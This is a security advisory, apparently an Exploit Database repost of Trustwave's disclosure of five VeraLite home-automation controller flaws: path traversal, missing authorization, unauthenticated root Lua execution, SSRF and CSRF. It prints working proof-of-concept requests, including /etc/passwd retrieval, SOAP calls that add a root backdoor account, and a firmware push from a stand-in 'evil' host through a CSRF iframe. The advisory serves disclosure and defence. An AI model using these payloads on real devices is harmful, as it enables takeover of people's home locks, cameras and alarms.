Trustwave SpiderLabs Security Advisory TWSL2013-019:
Multiple Vulnerabilities in MiCasaVerde VeraLite

Published: 08/01/13
Version: 1.0

Vendor: MiCasaVerde (http://www.micasaverde.com/)
Product: VeraLite
Version affected:  1.5.408

Product description:
The MiCasaVerde VeraLite is the budget model from MiCasaVerde, a product
which centralizes control over home automation devices such as door locks,
window blinds, security cameras, smoke detectors, HVAC systems, lights,
etc.

Finding 1: Path Traversal
*****Credit: Daniel Crowley of Trustwave SpiderLabs
CVE: CVE-2013-4861
CWE: CWE-23

The VeraLite has a path traversal vulnerability allowing for disclosure of
arbitrary files. This allows an attacker to retrieve the contents of any
file on the system such as the /etc/passwd file which contains the hashed
root password as well as the tech support remote access password if remote
access has been configured.

A proof of concept can be run against a VeraLite by using the following URL:
GET http://A.B.C.D/cgi-bin/cmh/get_file.sh?filename=../../../../../etc/passwd

On a newly unboxed VeraLite, this shouldn't work as the first part of the
path used by the script doesn't exist, but the directory which must exist
for exploitation to work correctly can be created by using the
store_file.sh script, like so:

GET http://A.B.C.D/cgi-bin/cmh/store_file.sh?store_file=test

This attack can also be launched through the Internet-based control panel
at cp.mios.com when logged in as either an admin or guest level account.

Finding 2: Insufficient Authorization Checks
*****Credit: Daniel Crowley of Trustwave SpiderLabs
CVE: CVE-2013-4862
CWE: CWE-285

The VeraLite makes a distinction between Administrator and Guest users such
that Guest users should not be able to make changes to the configuration of
the system. There are several functionalities included in the VeraLite
console available to Guest level users which can be used to escalate
privileges.

A) Firmware update - This allows a guest to push custom firmware to the
unit and can allow for full compromise of the device.

A proof of concept can be seen using the following URL:
GET http://A.B.C.D/upgrade_step2.sh?squashfs=http://example.com/evil_vera_firmware.squashfs

B) Settings backup - This allows a guest to obtain copies of various
sensitive files, including the lighttpd.users file which contains hashed
cp.mios.com passwords, and the passwd file which contains the hashed root
password.

GET http://A.B.C.D/cgi-bin/cmh/backup.sh?external=1

C) Test Luup code (Lua) - This allows a guest to run Lua code on the
VeraLite as root. A backdoor account can be added with the following POST
request:

POST /port_49451/upnp/control/hag HTTP/1.1
Host: A.B.C.D
Accept: text/javascript, text/html, application/xml, text/xml, */*
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-Prototype-Version: 1.7
Content-Type: text/xml;charset=UTF-8
MIME-Version: 1.0
SOAPACTION: "urn:schemas-micasaverde-org:service:HomeAutomationGateway:1#RunLua"
Content-Length: 311
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body>    <u:RunLua xmlns:u="urn:schemas-micasaverde-org:service:HomeAutomationGateway:1">        <DeviceNum></DeviceNum> <Code>os.execute("echo 'backdoor%3a%3a0%3a0%3aBackdoor Root Account%3a/tmp%3a/bin/ash' %3e%3e /etc/passwd")</Code>    </u:RunLua></s:Body></s:Envelope>

Finding 3: Insufficient Authentication Checks
*****Credit: Daniel Crowley of Trustwave SpiderLabs
CVE: CVE-2013-4863
CWE: CWE-287

The VeraLite exposes UPnP functionality which allows for Lua code to be run
as root from the LAN without authentication using the RunLua action in the
HomeAutomationGateway service of the HomeAutomationGateway device. A
backdoor account can be added with the following POST request to port
49451:

POST /upnp/control/hag HTTP/1.1
Host: A.B.C.D:49451
Accept: text/javascript, text/html, application/xml, text/xml, */*
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-Prototype-Version: 1.7
Content-Type: text/xml;charset=UTF-8
MIME-Version: 1.0
SOAPACTION: "urn:schemas-micasaverde-org:service:HomeAutomationGateway:1#RunLua"
Content-Length: 311
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body>    <u:RunLua xmlns:u="urn:schemas-micasaverde-org:service:HomeAutomationGateway:1">        <DeviceNum></DeviceNum> <Code>os.execute("echo 'backdoor%3a%3a0%3a0%3aBackdoor Root Account%3a/tmp%3a/bin/ash' %3e%3e /etc/passwd")</Code>    </u:RunLua></s:Body></s:Envelope>

Finding 4: Server-Side Request Forgery
*****Credit: Daniel Crowley of Trustwave SpiderLabs
CVE: CVE-2013-4864
CWE: CWE-918

The VeraLite will make HTTP requests on behalf of a user using the
/cgi-bin/cmh/proxy.sh script. A proof of concept to pull the homepage of
trustwave.com is as follows:

GET http://A.B.C.D/cgi-bin/cmh/proxy.sh?url=https://www.trustwave.com

This allows an attacker to bypass firewall controls, use the VeraLite as a proxy

Finding 5: Cross-Site Request Forgery
*****Credit: Daniel Crowley of Trustwave SpiderLabs
CVE: CVE-2013-4865
CWE: CWE-352

The VeraLite does not implement any defense against cross-site request
forgery. A proof of concept as seen below can cause a Vera user to update
their firmware using a custom firmware URL:

<html>
<body>
<iframe src="http://A.B.C.D/upgrade_step2.sh?squashfs=http://example.com/evil_vera_firmware.squashfs" width="1" height="1">
</iframe>
</body>
</html>

If this PoC was embedded in any web page a targeted user visited, an
attacker would be able to make arbitrary changes to the firmware on the
device, allowing the potential for remote root access.

Vendor Response:
"...the "vulnerabilities" you referred to were deliberate design decisions
because that's what the customers in this particular channel (ie Vera
retail) want.  As you can see we have an open forum to discuss this, and
very people object to leaving Vera open.  So we are not able to lock down
the gateway, and effectively break the systems of many customers who rely
on the open system to run their own scripts and plugins."

Remediation Steps:
No official patch is available.  To limit exposure,
network access to these devices should be limited to authorized
personnel through the use of access control lists and proper
network segmentation.

Revision History:
04/23/13 - Vulnerability disclosed to vendor
06/04/13 - Vendor confirms they will not fix
08/01/13 - Advisory published

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
